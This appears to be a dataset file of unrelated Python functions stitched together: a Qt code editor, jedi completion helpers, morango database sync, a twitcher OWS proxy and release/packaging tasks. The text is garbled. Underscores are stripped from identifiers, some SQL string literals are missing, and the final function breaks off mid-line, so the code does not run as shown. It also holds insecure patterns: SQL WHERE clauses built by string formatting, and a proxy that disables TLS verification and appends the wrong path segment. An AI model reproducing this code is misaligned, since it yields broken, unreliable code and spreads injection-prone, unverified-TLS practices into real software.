def on new ( self ) : interpreter , pyserver , args = self . get backend parameters ( ) self . setup editor ( self . tab Widget . create new document ( extension = '.py' , interpreter = interpreter , server script = pyserver , args = args ) ) self . action Run . set Disabled ( True ) self . action Configure run . set Disabled ( True )
def on save as ( self ) : path = self . tab Widget . current widget ( ) . file . path path = os . path . dirname ( path ) if path else '' filename , filter = Qt Widgets . Q File Dialog . get Save File Name ( self , 'Save' , path ) if filename : self . tab Widget . save current ( filename ) self . recent files manager . open file ( filename ) self . menu recents . update actions ( ) self . action Run . set Enabled ( True ) self . action Configure run . set Enabled ( True ) self . update status bar ( self . tab Widget . current widget ( ) )
def setup mnu style ( self , editor ) : menu = Qt Widgets . Q Menu ( 'Styles' , self . menu Edit ) group = Qt Widgets . Q Action Group ( self ) self . styles group = group current style = editor . syntax highlighter . color scheme . name group . triggered . connect ( self . on style changed ) for s in sorted ( PYGMENTS STYLES ) : a = Qt Widgets . Q Action ( menu ) a . set Text ( s ) a . set Checkable ( True ) if s == current style : a . set Checked ( True ) group . add Action ( a ) menu . add Action ( a ) self . menu Edit . add Menu ( menu )
def on current tab changed ( self ) : self . menu Edit . clear ( ) self . menu Modes . clear ( ) self . menu Panels . clear ( ) editor = self . tab Widget . current widget ( ) self . menu Edit . set Enabled ( editor is not None ) self . menu Modes . set Enabled ( editor is not None ) self . menu Panels . set Enabled ( editor is not None ) self . action Save . set Enabled ( editor is not None ) self . action Save as . set Enabled ( editor is not None ) self . action Configure run . set Enabled ( editor is not None ) self . action Run . set Enabled ( editor is not None ) if editor is not None : self . setup mnu edit ( editor ) self . setup mnu modes ( editor ) self . setup mnu panels ( editor ) self . widget Outline . set editor ( editor ) self . update status bar ( editor )
def on run ( self ) : filename = self . tab Widget . current widget ( ) . file . path wd = os . path . dirname ( filename ) args = Settings ( ) . get run config for file ( filename ) self . interactive Console . start process ( Settings ( ) . interpreter , args = [ filename ] + args , cwd = wd ) self . dock Widget . show ( ) self . action Run . set Enabled ( False ) self . action Configure run . set Enabled ( False )
def goto assignments ( request data ) : code = request data [ 'code' ] line = request data [ 'line' ] + 1 column = request data [ 'column' ] path = request data [ 'path' ] # encoding = request data['encoding'] encoding = 'utf-8' script = jedi . Script ( code , line , column , path , encoding ) try : definitions = script . goto assignments ( ) except jedi . Not Found Error : pass else : ret val = [ ( d . module path , d . line - 1 if d . line else None , d . column , d . full name ) for d in definitions ] return ret val
def defined names ( request data ) : global old definitions ret val = [ ] path = request data [ 'path' ] toplvl definitions = jedi . names ( request data [ 'code' ] , path , 'utf-8' ) for d in toplvl definitions : definition = extract def ( d , path ) if d . type != 'import' : ret val . append ( definition ) ret val = [ d . to dict ( ) for d in ret val ] return ret val
def quick doc ( request data ) : code = request data [ 'code' ] line = request data [ 'line' ] + 1 column = request data [ 'column' ] path = request data [ 'path' ] # encoding = 'utf-8' encoding = 'utf-8' script = jedi . Script ( code , line , column , path , encoding ) try : definitions = script . goto definitions ( ) except jedi . Not Found Error : return [ ] else : ret val = [ d . docstring ( ) for d in definitions ] return ret val
def make python patterns ( additional keywords = [ ] , additional builtins = [ ] ) : kw = r"\b" + any ( "keyword" , kwlist + additional keywords ) + r"\b" kw namespace = r"\b" + any ( "namespace" , kw namespace list ) + r"\b" word operators = r"\b" + any ( "operator word" , wordop list ) + r"\b" builtinlist = [ str ( name ) for name in dir ( builtins ) if not name . startswith ( ' ' ) ] + additional builtins for v in [ 'None' , 'True' , 'False' ] : builtinlist . remove ( v ) builtin = r"([^.'\"\\#]\b|^)" + any ( "builtin" , builtinlist ) + r"\b" builtin fct = any ( "builtin fct" , [ r' {2}[a-z A-Z ]* {2}' ] ) comment = any ( "comment" , [ r"#[^\n]*" ] ) instance = any ( "instance" , [ r"\bself\b" , r"\bcls\b" ] ) decorator = any ( 'decorator' , [ r'@\w*' , r'.setter' ] ) number = any ( "number" , [ r"\b[+-]?[0-9]+[l Lj J]?\b" , r"\b[+-]?0[x X][0-9A-Fa-f]+[l L]?\b" , r"\b[+-]?0[o O][0-7]+[l L]?\b" , r"\b[+-]?0[b B][01]+[l L]?\b" , r"\b[+-]?[0-9]+(?:\.[0-9]+)?(?:[e E][+-]?[0-9]+)?[j J]?\b" ] ) sqstring = r"(\b[r Ru U])?'[^'\\\n]*(\\.[^'\\\n]*)*'?" dqstring = r'(\b[r Ru U])?"[^"\\\n]*(\\.[^"\\\n]*)*"?' uf sqstring = r"(\b[r Ru U])?'[^'\\\n]*(\\.[^'\\\n]*)*(\\)$(?!')$" uf dqstring = r'(\b[r Ru U])?"[^"\\\n]*(\\.[^"\\\n]*)*(\\)$(?!")$' sq3string = r"(\b[r Ru U])?'''[^'\\]*((\\.|'(?!''))[^'\\]*)*(''')?" dq3string = r'(\b[r Ru U])?"""[^"\\]*((\\.|"(?!""))[^"\\]*)*(""")?' uf sq3string = r"(\b[r Ru U])?'''[^'\\]*((\\.|'(?!''))[^'\\]*)*(\\)?(?!''')$" uf dq3string = r'(\b[r Ru U])?"""[^"\\]*((\\.|"(?!""))[^"\\]*)*(\\)?(?!""")$' string = any ( "string" , [ sq3string , dq3string , sqstring , dqstring ] ) ufstring1 = any ( "uf sqstring" , [ uf sqstring ] ) ufstring2 = any ( "uf dqstring" , [ uf dqstring ] ) ufstring3 = any ( "uf sq3string" , [ uf sq3string ] ) ufstring4 = any ( "uf dq3string" , [ uf dq3string ] ) return "|" . join ( [ instance , decorator , kw , kw namespace , builtin , word operators , builtin fct , comment , ufstring1 , ufstring2 , ufstring3 , ufstring4 , string , number , any ( "SYNC" , [ r"\n" ] ) ] )
def unique ( self , seq ) : # order preserving checked = [ ] for e in seq : present = False for c in checked : if str ( c ) == str ( e ) : present = True break if not present : checked . append ( e ) return checked
def substitute Check Pattern ( self , input String , line Number , last Line Number , check File Name , is For Regex ) : assert isinstance ( input String , str ) assert isinstance ( line Number , int ) assert isinstance ( last Line Number , int ) assert isinstance ( check File Name , str ) s Pattern = r'\$\{LINE(\:(?P<sign>\+|-)(?P<offset>\d+))?\}' matcher = re . compile ( s Pattern ) result = "" loop = True start = 0 end = len ( input String ) # Not inclusive while loop : m = matcher . search ( input String , start , end ) if not m : # No match so copy verbatim logger . debug ( 'Result is currently "{}"' . format ( result ) ) result += input String [ start : end ] break # And we're done :) else : prev Index = max ( 0 , m . start ( ) - 1 ) logger . debug ( 'Previous character before match is at index {index} "{char}"' . format ( index = prev Index , char = input String [ prev Index ] ) ) if input String [ prev Index ] == "\\" : # User asked to escape logger . debug ( 'Substitution is escaped' ) logger . debug ( 'Result is currently "{}"' . format ( result ) ) result += input String [ start : prev Index ] # Copy before escaping character logger . debug ( 'Result is currently "{}"' . format ( result ) ) result += input String [ ( prev Index + 1 ) : m . end ( ) ] # Copy the ${LINE..} verbatim start = min ( m . end ( ) , end ) logger . debug ( 'Result is currently "{}"' . format ( result ) ) logger . debug ( 'Next search is {start}:{end} = "{ss}"' . format ( start = start , end = end , ss = input String [ start : end ] ) ) else : logger . debug ( 'Result is currently "{}"' . format ( result ) ) logger . debug ( 'Doing subsitution. Found at {begin}:{end} = {ss}' . format ( begin = m . start ( ) , end = m . end ( ) , ss = input String [ m . start ( ) : m . end ( ) ] ) ) result += input String [ start : m . start ( ) ] # Copy before substitution starts if m . groupdict ( ) [ 'sign' ] == None : # No offset just substitute line number logger . debug ( 'No offset' ) result += str ( line Number ) else : offset = 1 if m . groupdict ( ) [ 'sign' ] == '+' else - 1 offset *= int ( m . groupdict ( ) [ 'offset' ] ) logger . debug ( 'Offset is {}' . format ( offset ) ) requested Line Number = line Number + offset logger . debug ( 'Request line number to print is  {}' . format ( requested Line Number ) ) if requested Line Number <= 0 : raise Parsing Exception ( '{file}:{line}:{col} offset gives line number < 1' . format ( file = check File Name , line = line Number , col = m . start ( ) ) ) elif requested Line Number > last Line Number : raise Parsing Exception ( '{file}:{line}:{col} offset gives line number past the end of file' . format ( file = check File Name , line = line Number , col = m . start ( ) ) ) result += str ( requested Line Number ) start = min ( m . end ( ) , end ) logger . debug ( 'Next search is {start}:{end} = "{ss}"' . format ( start = start , end = end , ss = input String [ start : end ] ) ) # Do ${CHECKFILE NAME} substitution basename Check File Name = os . path . basename ( check File Name ) assert basename Check File Name . count ( '\\' ) == 0 result = self . simple Substitution ( "CHECKFILE NAME" , basename Check File Name , result ) # Do ${CHECKFILE ABS PATH} substitution abspath Check File Name = os . path . abspath ( check File Name ) if is For Regex : # Note slash substitution is for Windows paths (e.g. "c:\mything\foo.txt") which can break regexes if we don't # correctly escape them. abspath Check File Name = abspath Check File Name . replace ( '\\' , '\\\\' ) result = self . simple Substitution ( "CHECKFILE ABS PATH" , abspath Check File Name , result ) assert len ( result ) != 0 return result
def find libname ( self , name ) : names = [ "{}.lib" , "lib{}.lib" , "{}lib.lib" ] names = [ n . format ( name ) for n in names ] dirs = self . get library dirs ( ) for d in dirs : for n in names : if exists ( join ( d , n ) ) : return n [ : - 4 ] msg = "Could not find the {} library." . format ( name ) raise Value Error ( msg )
def finalize ( self ) : if self . head less : warn ( f'{self. class . name } configured to head less mode. finalize unusable' ) elif not self . head generate : warn ( f'{self. class . name } already finalized or fitted' ) elif not self . head dict : raise Not Fitted Error ( f'{self. class . name } instance is not fitted yet' ) else : if self . remove rare ratio : self . clean head ( * self . head rare ) self . prepare header ( ) self . head rare = None self . head generate = False
def fit ( self , x , y = None ) : x = iter2array ( x , dtype = ( Molecule Container , CGR Container ) ) if self . head less : warn ( f'{self. class . name } configured to head less mode. fit unusable' ) return self self . reset ( ) self . prepare ( x ) return self
def self referential fk ( klass model ) : for f in klass model . meta . concrete fields : if f . related model : if issubclass ( klass model , f . related model ) : return f . attname return None
def serialize ( self ) : opts = self . meta data = { } for f in opts . concrete fields : if f . attname in self . morango fields not to serialize : continue if f . attname in self . morango internal fields not to serialize : continue # case if model is morango mptt if f . attname in getattr ( self , ' internal mptt fields not to serialize' , ' internal fields not to serialize' ) : continue if hasattr ( f , 'value from object json compatible' ) : data [ f . attname ] = f . value from object json compatible ( self ) else : data [ f . attname ] = f . value from object ( self ) return data
def deserialize ( cls , dict model ) : kwargs = { } for f in cls . meta . concrete fields : if f . attname in dict model : kwargs [ f . attname ] = dict model [ f . attname ] return cls ( * * kwargs )
def get default ( self ) : if self . has default ( ) : if callable ( self . default ) : default = self . default ( ) if isinstance ( default , uuid . UUID ) : return default . hex return default if isinstance ( self . default , uuid . UUID ) : return self . default . hex return self . default return None
def calculate uuid ( self ) : # raise an error if no inputs to the UUID calculation were specified if self . uuid input fields is None : raise Not Implemented Error ( ) # if the UUID has been set to be random, return a random UUID if self . uuid input fields == "RANDOM" : return uuid . uuid4 ( ) . hex # if we got this far, uuid input fields should be a tuple assert isinstance ( self . uuid input fields , tuple ) , "'uuid input fields' must either be a tuple or the string 'RANDOM'" # calculate the input to the UUID function hashable input vals = [ ] for field in self . uuid input fields : new value = getattr ( self , field ) if new value : hashable input vals . append ( str ( new value ) ) hashable input = ":" . join ( hashable input vals ) # if all the values were falsey, just return a random UUID, to avoid collisions if not hashable input : return uuid . uuid4 ( ) . hex # compute the UUID as a function of the input values return sha2 uuid ( hashable input )
def serialize into store ( profile , filter = None ) : # ensure that we write and retrieve the counter in one go for consistency current id = Instance ID Model . get current instance and increment counter ( ) with transaction . atomic ( ) : # create Q objects for filtering by prefixes prefix condition = None if filter : prefix condition = functools . reduce ( lambda x , y : x | y , [ Q ( morango partition startswith = prefix ) for prefix in filter ] ) # filter through all models with the dirty bit turned on syncable dict = profile models [ profile ] for ( , klass model ) in six . iteritems ( syncable dict ) : new store records = [ ] new rmc records = [ ] klass queryset = klass model . objects . filter ( morango dirty bit = True ) if prefix condition : klass queryset = klass queryset . filter ( prefix condition ) store records dict = Store . objects . in bulk ( id list = klass queryset . values list ( 'id' , flat = True ) ) for app model in klass queryset : try : store model = store records dict [ app model . id ] # if store record dirty and app record dirty, append store serialized to conflicting data if store model . dirty bit : store model . conflicting serialized data = store model . serialized + "\n" + store model . conflicting serialized data store model . dirty bit = False # set new serialized data on this store model ser dict = json . loads ( store model . serialized ) ser dict . update ( app model . serialize ( ) ) store model . serialized = Django JSON Encoder ( ) . encode ( ser dict ) # create or update instance and counter on the record max counter for this store model Record Max Counter . objects . update or create ( defaults = { 'counter' : current id . counter } , instance id = current id . id , store model id = store model . id ) # update last saved bys for this store model store model . last saved instance = current id . id store model . last saved counter = current id . counter # update deleted flags in case it was previously deleted store model . deleted = False store model . hard deleted = False # update this model store model . save ( ) except Key Error : kwargs = { 'id' : app model . id , 'serialized' : Django JSON Encoder ( ) . encode ( app model . serialize ( ) ) , 'last saved instance' : current id . id , 'last saved counter' : current id . counter , 'model name' : app model . morango model name , 'profile' : app model . morango profile , 'partition' : app model . morango partition , 'source id' : app model . morango source id , } # check if model has FK pointing to it and add the value to a field on the store self ref fk = self referential fk ( klass model ) if self ref fk : self ref fk value = getattr ( app model , self ref fk ) kwargs . update ( { ' self ref fk' : self ref fk value or '' } ) # create store model and record max counter for the app model new store records . append ( Store ( * * kwargs ) ) new rmc records . append ( Record Max Counter ( store model id = app model . id , instance id = current id . id , counter = current id . counter ) ) # bulk create store and rmc records for this class Store . objects . bulk create ( new store records ) Record Max Counter . objects . bulk create ( new rmc records ) # set dirty bit to false for all instances of this model klass queryset . update ( update dirty bit to = False ) # get list of ids of deleted models deleted ids = Deleted Models . objects . filter ( profile = profile ) . values list ( 'id' , flat = True ) # update last saved bys and deleted flag of all deleted store model instances deleted store records = Store . objects . filter ( id in = deleted ids ) deleted store records . update ( dirty bit = False , deleted = True , last saved instance = current id . id , last saved counter = current id . counter ) # update rmcs counters for deleted models that have our instance id Record Max Counter . objects . filter ( instance id = current id . id , store model id in = deleted ids ) . update ( counter = current id . counter ) # get a list of deleted model ids that don't have an rmc for our instance id new rmc ids = deleted store records . exclude ( recordmaxcounter instance id = current id . id ) . values list ( "id" , flat = True ) # bulk create these new rmcs Record Max Counter . objects . bulk create ( [ Record Max Counter ( store model id = r id , instance id = current id . id , counter = current id . counter ) for r id in new rmc ids ] ) # clear deleted models table for this profile Deleted Models . objects . filter ( profile = profile ) . delete ( ) # handle logic for hard deletion models hard deleted ids = Hard Deleted Models . objects . filter ( profile = profile ) . values list ( 'id' , flat = True ) hard deleted store records = Store . objects . filter ( id in = hard deleted ids ) hard deleted store records . update ( hard deleted = True , serialized = '{}' , conflicting serialized data = '' ) Hard Deleted Models . objects . filter ( profile = profile ) . delete ( ) # update our own database max counters after serialization if not filter : Database Max Counter . objects . update or create ( instance id = current id . id , partition = "" , defaults = { 'counter' : current id . counter } ) else : for f in filter : Database Max Counter . objects . update or create ( instance id = current id . id , partition = f , defaults = { 'counter' : current id . counter } )
def deserialize from store ( profile ) : # we first serialize to avoid deserialization merge conflicts serialize into store ( profile ) fk cache = { } with transaction . atomic ( ) : syncable dict = profile models [ profile ] excluded list = [ ] # iterate through classes which are in foreign key dependency order for model name , klass model in six . iteritems ( syncable dict ) : # handle cases where a class has a single FK reference to itself self ref fk = self referential fk ( klass model ) query = Q ( model name = klass model . morango model name ) for klass in klass model . morango model dependencies : query |= Q ( model name = klass . morango model name ) if self ref fk : clean parents = Store . objects . filter ( dirty bit = False , profile = profile ) . filter ( query ) . char ids list ( ) dirty children = Store . objects . filter ( dirty bit = True , profile = profile ) . filter ( Q ( self ref fk in = clean parents ) | Q ( self ref fk = '' ) ) . filter ( query ) # keep iterating until size of dirty children is 0 while len ( dirty children ) > 0 : for store model in dirty children : try : app model = store model . deserialize store model ( fk cache ) if app model : with mute signals ( signals . pre save , signals . post save ) : app model . save ( update dirty bit to = False ) # we update a store model after we have deserialized it to be able to mark it as a clean parent store model . dirty bit = False store model . save ( update fields = [ 'dirty bit' ] ) except exceptions . Validation Error : # if the app model did not validate, we leave the store dirty bit set excluded list . append ( store model . id ) # update lists with new clean parents and dirty children clean parents = Store . objects . filter ( dirty bit = False , profile = profile ) . filter ( query ) . char ids list ( ) dirty children = Store . objects . filter ( dirty bit = True , profile = profile , self ref fk in = clean parents ) . filter ( query ) else : # array for holding db values from the fields of each model for this class db values = [ ] fields = klass model . meta . fields for store model in Store . objects . filter ( model name = model name , profile = profile , dirty bit = True ) : try : app model = store model . deserialize store model ( fk cache ) # if the model was not deleted add its field values to the list if app model : for f in fields : value = getattr ( app model , f . attname ) db value = f . get db prep value ( value , connection ) db values . append ( db value ) except exceptions . Validation Error : # if the app model did not validate, we leave the store dirty bit set excluded list . append ( store model . id ) if db values : # number of rows to update num of rows = len ( db values ) // len ( fields ) # create '%s' placeholders for a single row placeholder tuple = tuple ( [ '%s' for in range ( len ( fields ) ) ] ) # create list of the '%s' tuple placeholders based on number of rows to update placeholder list = [ str ( placeholder tuple ) for in range ( num of rows ) ] with connection . cursor ( ) as cursor : DB Backend . bulk insert into app models ( cursor , klass model . meta . db table , fields , db values , placeholder list ) # clear dirty bit for all store models for this profile except for models that did not validate Store . objects . exclude ( id in = excluded list ) . filter ( profile = profile , dirty bit = True ) . update ( dirty bit = False )
def queue into buffer ( transfersession ) : last saved by conditions = [ ] filter prefixes = Filter ( transfersession . filter ) server fsic = json . loads ( transfersession . server fsic ) client fsic = json . loads ( transfersession . client fsic ) if transfersession . push : fsics = fsic queuing calc ( client fsic , server fsic ) else : fsics = fsic queuing calc ( server fsic , client fsic ) # if fsics are identical or receiving end has newer data, then there is nothing to queue if not fsics : return # create condition for all push FSI Cs where instance ids are equal, but internal counters are higher than FSI Cs counters for instance , counter in six . iteritems ( fsics ) : last saved by conditions += [ "(last saved instance = '{0}' AND last saved counter > {1})" . format ( instance , counter ) ] if fsics : last saved by conditions = [ join with logical operator ( last saved by conditions , 'OR' ) ] partition conditions = [ ] # create condition for filtering by partitions for prefix in filter prefixes : partition conditions += [ "partition LIKE '{}%'" . format ( prefix ) ] if filter prefixes : partition conditions = [ join with logical operator ( partition conditions , 'OR' ) ] # combine conditions fsic and partition conditions = join with logical operator ( last saved by conditions + partition conditions , 'AND' ) # filter by profile where condition = join with logical operator ( [ fsic and partition conditions , "profile = '{}'" . format ( transfersession . sync session . profile ) ] , 'AND' ) # execute raw sql to take all records that match condition, to be put into buffer for transfer with connection . cursor ( ) as cursor : queue buffer = . format ( outgoing buffer = Buffer . meta . db table , transfer session id = transfersession . id , condition = where condition , store = Store . meta . db table ) cursor . execute ( queue buffer ) # take all record max counters that are foreign keyed onto store models, which were queued into the buffer queue rmc buffer = . format ( outgoing rmcb = Record Max Counter Buffer . meta . db table , transfer session id = transfersession . id , record max counter = Record Max Counter . meta . db table , outgoing buffer = Buffer . meta . db table ) cursor . execute ( queue rmc buffer )
def dequeue into store ( transfersession ) : with connection . cursor ( ) as cursor : DB Backend . dequeuing delete rmcb records ( cursor , transfersession . id ) DB Backend . dequeuing delete buffered records ( cursor , transfersession . id ) current id = Instance ID Model . get current instance and increment counter ( ) DB Backend . dequeuing merge conflict buffer ( cursor , current id , transfersession . id ) DB Backend . dequeuing merge conflict rmcb ( cursor , transfersession . id ) DB Backend . dequeuing update rmcs last saved by ( cursor , current id , transfersession . id ) DB Backend . dequeuing delete mc rmcb ( cursor , transfersession . id ) DB Backend . dequeuing delete mc buffer ( cursor , transfersession . id ) DB Backend . dequeuing insert remaining buffer ( cursor , transfersession . id ) DB Backend . dequeuing insert remaining rmcb ( cursor , transfersession . id ) DB Backend . dequeuing delete remaining rmcb ( cursor , transfersession . id ) DB Backend . dequeuing delete remaining buffer ( cursor , transfersession . id ) if getattr ( settings , 'MORANGO DESERIALIZE AFTER DEQUEUING' , True ) : deserialize from store ( transfersession . sync session . profile )
def multiple self ref fk check ( class model ) : self fk = [ ] for f in class model . meta . concrete fields : if f . related model in self fk : return True if f . related model == class model : self fk . append ( class model ) return False
def save service ( self , service , overwrite = True ) : name = namesgenerator . get sane name ( service . name ) if not name : name = namesgenerator . get random name ( ) if self . collection . count documents ( { 'name' : name } ) > 0 : name = namesgenerator . get random name ( retry = True ) # check if service is already registered if self . collection . count documents ( { 'name' : name } ) > 0 : if overwrite : self . collection . delete one ( { 'name' : name } ) else : raise Exception ( "service name already registered." ) self . collection . insert one ( Service ( name = name , url = baseurl ( service . url ) , type = service . type , purl = service . purl , public = service . public , auth = service . auth , verify = service . verify ) ) return self . fetch by name ( name = name )
def list services ( self ) : my services = [ ] for service in self . collection . find ( ) . sort ( 'name' , pymongo . ASCENDING ) : my services . append ( Service ( service ) ) return my services
def fetch by name ( self , name ) : service = self . collection . find one ( { 'name' : name } ) if not service : raise Service Not Found return Service ( service )
def fetch by url ( self , url ) : service = self . collection . find one ( { 'url' : url } ) if not service : raise Service Not Found return Service ( service )
def owsproxy delegate ( request ) : twitcher url = request . registry . settings . get ( 'twitcher.url' ) protected path = request . registry . settings . get ( 'twitcher.ows proxy protected path' , '/ows' ) url = twitcher url + protected path + '/proxy' if request . matchdict . get ( 'service name' ) : url += '/' + request . matchdict . get ( 'service name' ) if request . matchdict . get ( 'access token' ) : url += '/' + request . matchdict . get ( 'service name' ) url += '?' + urlparse . urlencode ( request . params ) LOGGER . debug ( "delegate to owsproxy: %s" , url ) # forward request to target (without Host Header) # h = dict(request.headers) # h.pop("Host", h) resp = requests . request ( method = request . method . upper ( ) , url = url , data = request . body , headers = request . headers , verify = False ) return Response ( resp . content , status = resp . status code , headers = resp . headers )
def main ( global config , * * settings ) : from pyramid . config import Configurator config = Configurator ( settings = settings ) # include twitcher components config . include ( 'twitcher.config' ) config . include ( 'twitcher.frontpage' ) config . include ( 'twitcher.rpcinterface' ) config . include ( 'twitcher.owsproxy' ) # tweens/middleware # TODO: maybe add tween for exception handling or use unknown failure view config . include ( 'twitcher.tweens' ) config . scan ( ) return config . make wsgi app ( )
def save service ( self , service , overwrite = True ) : name = namesgenerator . get sane name ( service . name ) if not name : name = namesgenerator . get random name ( ) if name in self . name index : name = namesgenerator . get random name ( retry = True ) # check if service is already registered if name in self . name index : if overwrite : self . delete ( name = name ) else : raise Exception ( "service name already registered." ) self . insert ( Service ( name = name , url = baseurl ( service . url ) , type = service . type , purl = service . purl , public = service . public , auth = service . auth , verify = service . verify ) ) return self . fetch by name ( name = name )
def list services ( self ) : my services = [ ] for service in self . name index . values ( ) : my services . append ( Service ( service ) ) return my services
def fetch by name ( self , name ) : service = self . name index . get ( name ) if not service : raise Service Not Found return Service ( service )
def get param ( self , param , allowed values = None , optional = False ) : request params = self . request params ( ) if param in request params : value = request params [ param ] . lower ( ) if allowed values is not None : if value in allowed values : self . params [ param ] = value else : raise OWS Invalid Parameter Value ( "%s %s is not supported" % ( param , value ) , value = param ) elif optional : self . params [ param ] = None else : raise OWS Missing Parameter Value ( 'Parameter "%s" is missing' % param , value = param ) return self . params [ param ]
def get version ( self ) : version = self . get param ( param = "version" , allowed values = allowed versions [ self . params [ 'service' ] ] , optional = True ) if version is None and self . get request type ( ) != "getcapabilities" : raise OWS Missing Parameter Value ( 'Parameter "version" is missing' , value = "version" ) else : return version
def get service ( self ) : if "service" in self . document . attrib : value = self . document . attrib [ "service" ] . lower ( ) if value in allowed service types : self . params [ "service" ] = value else : raise OWS Invalid Parameter Value ( "Service %s is not supported" % value , value = "service" ) else : raise OWS Missing Parameter Value ( 'Parameter "service" is missing' , value = "service" ) return self . params [ "service" ]
def get request type ( self ) : value = self . document . tag . lower ( ) if value in allowed request types [ self . params [ 'service' ] ] : self . params [ "request" ] = value else : raise OWS Invalid Parameter Value ( "Request type %s is not supported" % value , value = "request" ) return self . params [ "request" ]
def get version ( self ) : if "version" in self . document . attrib : value = self . document . attrib [ "version" ] . lower ( ) if value in allowed versions [ self . params [ 'service' ] ] : self . params [ "version" ] = value else : raise OWS Invalid Parameter Value ( "Version %s is not supported" % value , value = "version" ) elif self . get request type ( ) == "getcapabilities" : self . params [ "version" ] = None else : raise OWS Missing Parameter Value ( 'Parameter "version" is missing' , value = "version" ) return self . params [ "version" ]
def localize datetime ( dt , tz name = 'UTC' ) : tz aware dt = dt if dt . tzinfo is None : utc = pytz . timezone ( 'UTC' ) aware = utc . localize ( dt ) timezone = pytz . timezone ( tz name ) tz aware dt = aware . astimezone ( timezone ) else : logger . warn ( 'tzinfo already set' ) return tz aware dt
def baseurl ( url ) : parsed url = urlparse . urlparse ( url ) if not parsed url . netloc or parsed url . scheme not in ( "http" , "https" ) : raise Value Error ( 'bad url' ) service url = "%s://%s%s" % ( parsed url . scheme , parsed url . netloc , parsed url . path . strip ( ) ) return service url
def verify ( self ) : value = self . get ( 'verify' , 'true' ) if isinstance ( value , bool ) : verify = value elif value . lower ( ) == 'true' : verify = True elif value . lower ( ) == 'false' : verify = False else : verify = value return verify
def tag ( self , label , message = None ) : notify . warning ( 'Unsupported SCM: Make sure you apply the "{}" tag after commit!{}' . format ( label , ' [message={}]' . format ( message ) if message else '' , ) )
def pep440 dev version ( self , verbose = False , non local = False ) : # Always return a timestamp pep440 = '.dev{:%Y%m%d%H%M}' . format ( datetime . now ( ) ) if not non local : build number = os . environ . get ( 'BUILD NUMBER' , 'n/a' ) if build number . isdigit ( ) : pep440 += '+ci.{}' . format ( build number ) if verbose : notify . info ( "Adding CI build ID #{} to version" . format ( build number ) ) return pep440
def get egg info ( cfg , verbose = False ) : result = Bunch ( ) setup py = cfg . rootjoin ( 'setup.py' ) if not os . path . exists ( setup py ) : return result egg info = shell . capture ( "python {} egg info" . format ( setup py ) , echo = True if verbose else None ) for info line in egg info . splitlines ( ) : if info line . endswith ( 'PKG-INFO' ) : pkg info file = info line . split ( None , 1 ) [ 1 ] result [ ' file ' ] = pkg info file with io . open ( pkg info file , encoding = 'utf-8' ) as handle : lastkey = None for line in handle : if line . lstrip ( ) != line : assert lastkey , "Bad continuation in PKG-INFO file '{}': {}" . format ( pkg info file , line ) result [ lastkey ] += '\n' + line else : lastkey , value = line . split ( ':' , 1 ) lastkey = lastkey . strip ( ) . lower ( ) . replace ( '-' , ' ' ) value = value . strip ( ) if lastkey in result : try : result [ lastkey ] . append ( value ) except Attribute Error : result [ lastkey ] = [ result [ lastkey ] , value ] else : result [ lastkey ] = value for multikey in PKG INFO MULTIKEYS : if not isinstance ( result . get ( multikey , [ ] ) , list ) : result [ multikey ] = [ result [ multikey ] ] return result
def bump ( ctx , verbose = False , pypi = False ) : cfg = config . load ( ) scm = scm provider ( cfg . project root , commit = False , ctx = ctx ) # Check for uncommitted changes if not scm . workdir is clean ( ) : notify . warning ( "You have uncommitted changes, will create a time-stamped version!" ) pep440 = scm . pep440 dev version ( verbose = verbose , non local = pypi ) # Rewrite 'setup.cfg'  TODO: refactor to helper, see also release-prep # with util.rewrite file(cfg.rootjoin('setup.cfg')) as lines: #     ... setup cfg = cfg . rootjoin ( 'setup.cfg' ) if not pep440 : notify . info ( "Working directory contains a release version!" ) elif os . path . exists ( setup cfg ) : with io . open ( setup cfg , encoding = 'utf-8' ) as handle : data = handle . readlines ( ) changed = False for i , line in enumerate ( data ) : if re . match ( r"#? *tag build *= *.*" , line ) : verb , = data [ i ] . split ( '=' , 1 ) data [ i ] = '{}= {}\n' . format ( verb , pep440 ) changed = True if changed : notify . info ( "Rewriting 'setup.cfg'..." ) with io . open ( setup cfg , 'w' , encoding = 'utf-8' ) as handle : handle . write ( '' . join ( data ) ) else : notify . warning ( "No 'tag build' setting found in 'setup.cfg'!" ) else : notify . warning ( "Cannot rewrite 'setup.cfg', none found!" ) if os . path . exists ( setup cfg ) : # Update metadata and print version egg info = shell . capture ( "python setup.py egg info" , echo = True if verbose else None ) for line in egg info . splitlines ( ) : if line . endswith ( 'PKG-INFO' ) : pkg info file = line . split ( None , 1 ) [ 1 ] with io . open ( pkg info file , encoding = 'utf-8' ) as handle : notify . info ( '\n' . join ( i for i in handle . readlines ( ) if i . startswith ( 'Version:' ) ) . strip ( ) ) ctx . run ( "python setup.py -q develop" , echo = True if verbose else None )
def dist ( ctx , devpi = False , egg = False , wheel = False , auto = True ) : config . load ( ) cmd = [ "python" , "setup.py" , "sdist" ] # Automatically create wheels if possible if auto : egg = sys . version info . major == 2 try : import wheel as wheel = True except Import Error : wheel = False if egg : cmd . append ( "bdist egg" ) if wheel : cmd . append ( "bdist wheel" ) ctx . run ( "invoke clean --all build --docs test check" ) ctx . run ( ' ' . join ( cmd ) ) if devpi : ctx . run ( "devpi upload dist/*" )
def pex ( ctx , pyrun = '' , upload = False , opts = '' ) : cfg = config . load ( ) # Build and check release ctx . run ( ": invoke clean --all build test check" ) # Get full version pkg info = get egg info ( cfg ) # from pprint import pprint; pprint(dict(pkg info)) version = pkg info . version if pkg info else cfg . project . version # Build a PEX for each console entry-point pex files = [ ] # from pprint import pprint; pprint(cfg.project.entry points) for script in cfg . project . entry points [ 'console scripts' ] : script , entry point = script . split ( '=' , 1 ) script , entry point = script . strip ( ) , entry point . strip ( ) pex file = cfg . rootjoin ( 'bin' , '{}-{}.pex' . format ( script , version ) ) cmd = [ 'pex' , '-r' , cfg . rootjoin ( 'requirements.txt' ) , cfg . project root , '-c' , script , '-o' , pex file ] if opts : cmd . append ( opts ) ctx . run ( ' ' . join ( cmd ) ) # Warn about non-portable stuff non universal = set ( ) with closing ( zipfile . Zip File ( pex file , mode = "r" ) ) as pex contents : for pex name in pex contents . namelist ( ) : # pylint: disable=no-member if pex name . endswith ( 'WHEEL' ) and '-py2.py3-none-any.whl' not in pex name : non universal . add ( pex name . split ( '.whl' ) [ 0 ] . split ( '/' ) [ - 1 ] ) if non universal : notify . warning ( "Non-universal or native wheels in PEX '{}':\n    {}" . format ( pex file . replace ( os . getcwd ( ) , '.' ) , '\n    ' . join ( sorted ( non universal ) ) ) ) envs = [ i . split ( '-' ) [ - 3 : ] for i in non universal ] envs = { i [ 0 ] : i [ 1 : ] for i in envs } if len ( envs ) > 1 : envs = { k : v for k , v in envs . items 